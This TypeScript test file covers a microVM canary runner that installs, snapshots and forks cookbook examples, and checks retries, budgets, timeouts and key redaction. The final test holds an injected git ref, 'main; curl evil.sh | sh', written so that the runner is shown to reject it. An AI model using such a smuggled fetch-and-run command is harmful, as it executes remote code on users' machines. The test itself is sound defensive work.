/**
 * End-to-end tests for the orchestrator, against the in-memory pool.
 *
 * Everything the runner does — install once, snapshot, fork per example,
 * classify, retry, budget, redact — is exercised here with no API key, no
 * network, and no billable microVMs.
 */

import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { parseConfig } from "../src/config.ts";
import { runCanary, type ExampleResult, type RunSummary, type RunnerDeps } from "../src/runner.ts";
import { FakeClock, FakePool, type FakePoolOptions } from "../src/solari/fake.ts";
import type { BrowserProbe, Machine, MachinePool, PageCapture } from "../src/solari/types.ts";

const REPO = "https://github.com/solari-sdk/solari-cookbook";
const KEY = "slr_live_testkey1234567890";

const TREE = [
  "browser-scrape/package.json",
  "browser-scrape/package-lock.json",
  "browser-scrape/index.js",
  "sandbox-runner/package.json",
  "sandbox-runner/package-lock.json",
  "sandbox-runner/index.js",
  "desktop-tour/package.json",
  "desktop-tour/index.js",
  "py-agent/requirements.txt",
  "py-agent/main.py",
  "notes/README.md",
];

const MANIFESTS: Record<string, unknown> = {
  "browser-scrape": {
    name: "browser-scrape",
    scripts: { start: "node index.js" },
    dependencies: { "@solarisdk/browser": "^1.0.0" },
  },
  "sandbox-runner": { name: "sandbox-runner", dependencies: { "@solarisdk/sandbox": "^1.0.0" } },
  "desktop-tour": { name: "desktop-tour", dependencies: { "@solarisdk/desktop": "^1.0.0" } },
};

/**
 * A pool primed to look like the cookbook: a clone that works, a find that
 * lists the tree, and manifests on disk. Extra handlers are consulted first, so
 * any individual command can be made to misbehave.
 */
function cookbook(options: FakePoolOptions = {}): FakePool {
  const files: Record<string, string> = {};
  for (const [name, manifest] of Object.entries(MANIFESTS)) {
    files[`repo/examples/${name}/package.json`] = JSON.stringify(manifest);
  }
  return new FakePool({
    ...options,
    files: { ...files, ...options.files },
    handlers: [
      ...(options.handlers ?? []),
      { match: /^git clone /, respond: { stdout: "Cloning into 'repo'..." } },
      { match: /^git -C repo rev-parse HEAD$/, respond: { stdout: "abcdef1234567890abcdef01\n" } },
      { match: /^find /, respond: { stdout: TREE.map((path) => `repo/examples/${path}`).join("\n") } },
    ],
  });
}

interface RunOptions {
  config?: Record<string, unknown>;
  deps?: Partial<RunnerDeps>;
}

async function run(machines: MachinePool, options: RunOptions = {}) {
  const logs: string[] = [];
  const summary = await runCanary(parseConfig({ repo: REPO, ...options.config }), {
    machines,
    clock: new FakeClock(),
    env: { SOLARI_API_KEY: KEY },
    log: (line) => logs.push(line),
    ...options.deps,
  });
  return { summary, logs };
}

function byName(summary: RunSummary): Record<string, ExampleResult> {
  return Object.fromEntries(summary.results.map((result) => [result.name, result]));
}

describe("runCanary — the install-once path", () => {
  it("installs each example once in the prep machine, then forks the snapshot", async () => {
    const pool = cookbook();
    const { summary, logs } = await run(pool);

    const prep = pool.created[0];
    assert.ok(prep);
    assert.equal(prep.id, summary.prep.machineId);
    assert.equal(summary.prep.headSha, "abcdef123456");
    assert.equal(summary.prep.snapshotId, "snap_1");
    assert.deepEqual(pool.snapshotLabels, ["canary-abcdef123456"]);

    // One clone, one rev-parse, one find — all in the prep machine.
    const prepLines = pool.execs.filter((record) => record.machineId === prep.id).map((r) => r.line);
    assert.equal(prepLines.filter((line) => line.startsWith("git clone ")).length, 1);
    assert.equal(prepLines.filter((line) => line.startsWith("find ")).length, 1);

    // Installs happen there too, once each, and never again in a fork. (The
    // desktop example is absent on purpose: it cannot fork a headless snapshot,
    // so it installs inside its own VM.)
    const installs = pool.execs.filter(
      (record) => record.machineId === prep.id && /^(npm (ci|install)|pip install)/.test(record.line),
    );
    assert.deepEqual(
      installs.map((record) => [record.line, record.cwd]),
      [
        ["npm ci --no-audit --no-fund", "repo/examples/browser-scrape"],
        ["pip install --quiet -r requirements.txt", "repo/examples/py-agent"],
        ["npm ci --no-audit --no-fund", "repo/examples/sandbox-runner"],
      ],
    );

    // Three runnable sandbox examples, each on its own fork of the one snapshot.
    const forks = pool.created.filter((machine) => machine.fromSnapshot !== undefined);
    assert.equal(forks.length, 3);
    assert.ok(forks.every((machine) => machine.fromSnapshot === "snap_1"));

    assert.deepEqual(summary.totals, { pass: 4, fail: 0, skipped: 1, flake: 0, timeout: 0 });
    assert.equal(summary.exitCode, 0);
    assert.equal(byName(summary)["notes"]?.reason, "no package.json or requirements.txt — cannot tell how to run it");
    assert.match(logs.join("\n"), /snapshot snap_1 — forks start from here/);
  });

  it("gives the prep machine's quota slot back before fanning out, and kills every fork", async () => {
    const pool = cookbook();
    await run(pool);
    // The snapshot outlives the machine that made it, so nothing should still be
    // billing once the run is over.
    assert.deepEqual(pool.liveMachines(), []);
    assert.equal(pool.created[0]?.killed, true);
  });

  it("runs each example in its own fork with the credential in the env", async () => {
    const pool = cookbook();
    await run(pool);
    const runs = pool.execs.filter((record) => /^(npm start|node index\.js|python main\.py)$/.test(record.line));
    assert.equal(runs.length, 4);
    for (const record of runs) {
      assert.notEqual(record.machineId, pool.created[0]?.id, `${record.line} must not run in the prep machine`);
      assert.deepEqual(record.env, { SOLARI_API_KEY: KEY });
    }
  });
});

describe("runCanary — verdicts", () => {
  it("fails the build on a broken example, with redacted evidence attached", async () => {
    const pool = cookbook({
      handlers: [
        {
          match: /^python main\.py$/,
          respond: { exitCode: 1, stderr: `AssertionError: expected 3 pages (used ${KEY})` },
        },
      ],
    });
    const { summary } = await run(pool);
    const result = byName(summary)["py-agent"];

    assert.equal(result?.outcome, "fail");
    assert.equal(result?.reason, "exited 1");
    assert.match(result?.run?.stderrTail ?? "", /AssertionError: expected 3 pages/);
    assert.match(result?.run?.stderrTail ?? "", /\[redacted\]/);
    assert.doesNotMatch(result?.run?.stderrTail ?? "", /slr_live/);
    assert.equal(summary.totals.fail, 1);
    assert.equal(summary.exitCode, 1);
  });

  it("skips without booting a single machine when the credential is absent", async () => {
    // A microVM whose only output is "SOLARI_API_KEY is not set" is a machine
    // you paid for to learn nothing.
    const pool = cookbook();
    const { summary } = await run(pool, { deps: { env: {} } });

    assert.equal(summary.totals.skipped, 5);
    assert.equal(summary.exitCode, 0);
    assert.equal(pool.created.length, 1, "only the prep machine");
    assert.equal(
      byName(summary)["browser-scrape"]?.reason,
      "missing SOLARI_API_KEY in this environment",
    );
  });

  it("keeps an example whose install failed off a fork entirely", async () => {
    const pool = cookbook({
      handlers: [
        { match: /^pip install/, respond: { exitCode: 1, stderr: "ERROR: no matching distribution" } },
      ],
    });
    const { summary } = await run(pool);
    const result = byName(summary)["py-agent"];

    assert.equal(result?.outcome, "fail");
    assert.equal(result?.reason, "install: exited 1");
    assert.equal(result?.install?.exitCode, 1);
    assert.equal(result?.machineId, summary.prep.machineId);
    assert.equal(pool.execs.some((record) => record.line === "python main.py"), false);
    assert.equal(pool.created.filter((machine) => machine.fromSnapshot).length, 2);
  });
});

describe("runCanary — retries and budget", () => {
  it("retries only the verdicts a re-run could plausibly fix", async () => {
    let starts = 0;
    const pool = cookbook({
      handlers: [
        {
          match: /^npm start$/,
          respond: () => (++starts === 1 ? { exitCode: 1, stderr: "npm ERR! network ECONNRESET" } : {}),
        },
        { match: /^python main\.py$/, respond: { exitCode: 1, stderr: "AssertionError: expected 3" } },
      ],
    });
    const { summary, logs } = await run(pool, { config: { retries: 2 } });

    const scrape = byName(summary)["browser-scrape"];
    assert.equal(scrape?.outcome, "pass");
    assert.equal(scrape?.attempts, 2);
    assert.equal(starts, 2, "retried exactly once");
    // A failed assertion is not retryable: the second run fails identically.
    assert.equal(byName(summary)["py-agent"]?.attempts, 1);
    assert.match(logs.join("\n"), /retry 1\/2 for browser-scrape after: network or upstream error/);
    // The retry gets a clean fork rather than reusing the machine that failed.
    assert.equal(pool.created.filter((machine) => machine.fromSnapshot).length, 4);
  });

  it("stops handing out machines once the machine-minute budget is spent", async () => {
    const clock = new FakeClock();
    const pool = cookbook({
      handlers: [
        {
          match: /^(npm start|node index\.js|python main\.py)$/,
          respond: () => {
            clock.advance(40_000);
            return {};
          },
        },
      ],
    });
    const { summary } = await run(pool, {
      config: { concurrency: 1, maxMachineMinutes: 1, retries: 0 },
      deps: { clock },
    });

    const results = byName(summary);
    assert.equal(results["browser-scrape"]?.outcome, "pass");
    assert.equal(results["desktop-tour"]?.outcome, "pass");
    for (const name of ["py-agent", "sandbox-runner"]) {
      assert.equal(results[name]?.outcome, "skipped", name);
      assert.equal(results[name]?.reason, "machine-minute budget (1m) exhausted");
      assert.equal(results[name]?.machineId, undefined);
    }
    assert.equal(summary.machineMinutes, 1.33);
  });
});

describe("runCanary — desktops", () => {
  it("routes a display example to a desktop VM that bootstraps itself", async () => {
    const pool = cookbook();
    const { summary } = await run(pool);
    const result = byName(summary)["desktop-tour"];

    assert.equal(result?.machineKind, "desktop");
    assert.equal(result?.outcome, "pass");
    assert.match(result?.streamUrl ?? "", /^https:\/\/stream\.test\//);

    // It cannot fork a headless sandbox snapshot, so it pays for its own clone
    // and install — stated in the report rather than hidden.
    const own = pool.execs.filter((record) => record.machineId === result?.machineId).map((r) => r.line);
    assert.equal(own.filter((line) => line.startsWith("git clone ")).length, 1);
    assert.ok(own.includes("npm install --no-audit --no-fund"));
    assert.equal(result?.install?.exitCode, 0);

    // The frame is kept even on a pass: for a GUI example it is the only
    // readable evidence that anything happened.
    assert.equal(
      result?.visual?.screenshotBase64,
      Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]).toString("base64"),
    );
  });

  it("reports a desktop example's own install failure and destroys the VM", async () => {
    const pool = cookbook({
      handlers: [{ match: /^npm install /, respond: { exitCode: 1, stderr: "npm ERR! peer dep conflict" } }],
    });
    const { summary } = await run(pool, { config: { retries: 0 } });
    const result = byName(summary)["desktop-tour"];

    assert.equal(result?.outcome, "fail");
    assert.equal(result?.reason, "install: exited 1");
    assert.equal(result?.run, undefined, "never got as far as running");
    assert.deepEqual(pool.liveMachines(), []);
  });
});

/** Wraps a pool so forks hang on exec, to provoke a real deadline. */
function hangingForks(pool: FakePool): MachinePool {
  return {
    createSandbox: (spec) => pool.createSandbox(spec),
    createDesktop: (spec) => pool.createDesktop(spec),
    createFromSnapshot: async (snapshotId, spec) => {
      const machine = await pool.createFromSnapshot(snapshotId, spec);
      return {
        id: machine.id,
        kind: machine.kind,
        exec: () => new Promise<never>(() => {}),
        writeFile: (path, contents) => machine.writeFile(path, contents),
        readText: (path) => machine.readText(path),
        setIdleTimeout: (ms) => machine.setIdleTimeout(ms),
        kill: () => machine.kill(),
      } satisfies Machine;
    },
  };
}

describe("runCanary — deadlines", () => {
  it("times out a run that never returns, and still tears the machine down", async () => {
    const pool = cookbook();
    const { summary } = await run(hangingForks(pool), {
      config: { retries: 0, timeoutMs: 1_000 },
      deps: { only: ["browser-scrape"] },
    });
    const result = byName(summary)["browser-scrape"];

    assert.equal(result?.outcome, "timeout");
    assert.equal(result?.reason, "timed out");
    assert.equal(summary.exitCode, 1, "a hang is a broken example, not a flake");
    // The `finally` has to fire even though the command never came back.
    assert.deepEqual(pool.liveMachines(), []);
  });
});

const PREVIEW_CONFIG = {
  retries: 0,
  overrides: {
    "browser-scrape": {
      verify: { kind: "preview", port: 3000, path: "/health", expectText: ["Scraped 3 pages"] },
    },
  },
};

/** A browser whose replay URL only exists once the session has been released. */
function fakeBrowser(capture: Partial<PageCapture>) {
  const state = { launches: 0, closed: false, urls: [] as string[], headers: [] as unknown[] };
  const factory = async (): Promise<BrowserProbe> => {
    state.launches += 1;
    return {
      async capture(url, opts) {
        state.urls.push(url);
        state.headers.push(opts?.headers);
        return { title: "", texts: [], png: new Uint8Array([1, 2, 3]), sessionId: "sess_9", ...capture };
      },
      async replayUrlFor(sessionId) {
        return state.closed ? `https://replay.test/${sessionId}` : undefined;
      },
      async close() {
        state.closed = true;
      },
    };
  };
  return { factory, state };
}

/** Answers 425 until the nth call, then the given status. */
function previewFetch(statuses: number[]) {
  const calls: Record<string, string>[] = [];
  const impl = (async (_url: string | URL, init?: RequestInit) => {
    const status = statuses[Math.min(calls.length, statuses.length - 1)] as number;
    calls.push((init?.headers ?? {}) as Record<string, string>);
    return { status, text: async () => "<h1>Scraped 3 pages</h1>" } as Response;
  }) as unknown as typeof fetch;
  return { impl, calls };
}

describe("runCanary — examples that serve instead of exiting", () => {
  it("starts the server, waits for the port, and checks what a real browser sees", async () => {
    const pool = cookbook();
    const browser = fakeBrowser({ title: "Scrape demo", texts: ["Scraped 3 pages"] });
    const fetcher = previewFetch([425, 200]);
    const { summary } = await run(pool, {
      config: PREVIEW_CONFIG,
      deps: { browser: browser.factory, fetchImpl: fetcher.impl, only: ["browser-scrape"] },
    });
    const result = byName(summary)["browser-scrape"];

    assert.equal(result?.outcome, "pass");
    // Still running when we stopped it is a pass, not exit code 143.
    assert.equal(result?.run?.exitCode, 0);
    assert.deepEqual(result?.preview, {
      url: "https://p3000.preview.test/health?[redacted:preview-token]",
      status: 200,
      attempts: 2,
    });
    assert.equal(result?.visual?.title, "Scrape demo");
    assert.deepEqual(result?.visual?.missing, []);
    // No screenshot on a pass: a green run does not need base64 PNGs in it.
    assert.equal(result?.visual?.screenshotBase64, undefined);
    // Replays only exist after the session is released, so this is backfilled.
    assert.equal(result?.visual?.replayUrl, "https://replay.test/sess_9");

    assert.deepEqual(fetcher.calls[0], { "x-pinetree-preview-token": "pt_faketoken3000" });
    assert.deepEqual(browser.state.headers, [{ "x-pinetree-preview-token": "pt_faketoken3000" }]);
    const started = pool.execs.filter((record) => record.background);
    assert.deepEqual(
      started.map((record) => [record.line, record.cwd, record.env]),
      [["npm start", "repo/examples/browser-scrape", { SOLARI_API_KEY: KEY }]],
    );
  });

  it("fails the boots-but-blank case and keeps the picture", async () => {
    const pool = cookbook();
    const browser = fakeBrowser({ title: "Error", texts: ["500 Internal Server Error"] });
    const { summary } = await run(pool, {
      config: PREVIEW_CONFIG,
      deps: {
        browser: browser.factory,
        fetchImpl: previewFetch([200]).impl,
        only: ["browser-scrape"],
      },
    });
    const result = byName(summary)["browser-scrape"];

    assert.equal(result?.outcome, "fail");
    assert.equal(result?.reason, 'page did not contain "Scraped 3 pages"');
    assert.deepEqual(result?.visual?.missing, ["Scraped 3 pages"]);
    assert.equal(result?.visual?.screenshotBase64, Buffer.from([1, 2, 3]).toString("base64"));
    assert.equal(summary.exitCode, 1);
  });

  it("does not open a browser at all when the port never answers", async () => {
    const pool = cookbook();
    const browser = fakeBrowser({ title: "unused", texts: [] });
    const { summary } = await run(pool, {
      config: PREVIEW_CONFIG,
      deps: {
        browser: browser.factory,
        fetchImpl: previewFetch([425]).impl,
        only: ["browser-scrape"],
      },
    });
    const result = byName(summary)["browser-scrape"];

    assert.equal(result?.outcome, "fail");
    assert.match(result?.reason ?? "", /nothing was listening on the port after 30 attempts/);
    assert.equal(browser.state.launches, 0, "no session, no bill");
    assert.equal(result?.visual, undefined);
  });

  it("says so plainly when a preview check has no browser to run in", async () => {
    const { summary } = await run(cookbook(), {
      config: PREVIEW_CONFIG,
      deps: { fetchImpl: previewFetch([200]).impl, only: ["browser-scrape"] },
    });
    assert.match(byName(summary)["browser-scrape"]?.reason ?? "", /no browser factory was supplied/);
  });
});

describe("runCanary — degraded pools and selection", () => {
  it("runs sequentially in the prep machine when the pool cannot snapshot", async () => {
    const pool = cookbook({ snapshots: false });
    const { summary, logs } = await run(pool);

    assert.equal(summary.prep.snapshotId, undefined);
    assert.equal(pool.created.filter((machine) => machine.fromSnapshot).length, 0);
    assert.match(logs.join("\n"), /pool cannot snapshot — falling back to sequential runs/);

    // The prep machine has to survive the fan-out here, and the examples still
    // have to pass — a killed FakeMachine throws on exec, so this proves it.
    const prep = pool.created[0];
    const ranInPrep = pool.execs
      .filter((record) => record.machineId === prep?.id)
      .map((record) => record.line);
    assert.ok(ranInPrep.includes("npm start"));
    assert.ok(ranInPrep.includes("python main.py"));
    assert.equal(summary.totals.pass, 4);
    assert.deepEqual(pool.liveMachines(), [], "and it is killed once, at the end");
  });

  it("pays for nothing it was told not to run", async () => {
    const pool = cookbook();
    const { summary } = await run(pool, { deps: { only: ["py-agent"] } });
    const results = byName(summary);

    assert.equal(results["py-agent"]?.outcome, "pass");
    for (const name of ["browser-scrape", "sandbox-runner", "desktop-tour"]) {
      assert.equal(results[name]?.outcome, "skipped", name);
      assert.equal(results[name]?.reason, "not selected");
    }
    // Not selected means not installed either, which is where the money goes.
    assert.deepEqual(pool.execs.filter((record) => /^npm (ci|install)/.test(record.line)), []);
    assert.equal(pool.created.length, 2, "prep plus one fork");
  });

  it("reports a machine that could not be created as a flake, not a broken example", async () => {
    const pool = cookbook({ failCreateAt: 2 });
    const { summary } = await run(pool, { config: { retries: 0 }, deps: { only: ["browser-scrape"] } });
    const result = byName(summary)["browser-scrape"];

    assert.equal(result?.outcome, "flake");
    assert.equal(result?.reason, "network or upstream error");
    assert.equal(summary.exitCode, 0, "infrastructure trouble must not cry wolf");
  });

  it("aborts the run when the clone fails, and does not leave the prep VM billing", async () => {
    const pool = cookbook({
      handlers: [
        { match: /^git clone /, respond: { exitCode: 128, stderr: "fatal: Remote branch nope not found" } },
      ],
    });
    await assert.rejects(
      run(pool, { config: { ref: "nope" } }),
      /clone failed: fatal: Remote branch nope not found/,
    );
    assert.deepEqual(pool.liveMachines(), []);
  });

  it("refuses a ref that is trying to be a shell command", async () => {
    // The sandbox never interprets a shell, and this is where that stops being
    // a footnote and starts being the reason a hostile ref does nothing.
    await assert.rejects(
      run(cookbook(), { config: { ref: "main; curl evil.sh | sh" } }),
      /shell syntax is not interpreted by the sandbox/,
    );
  });
});
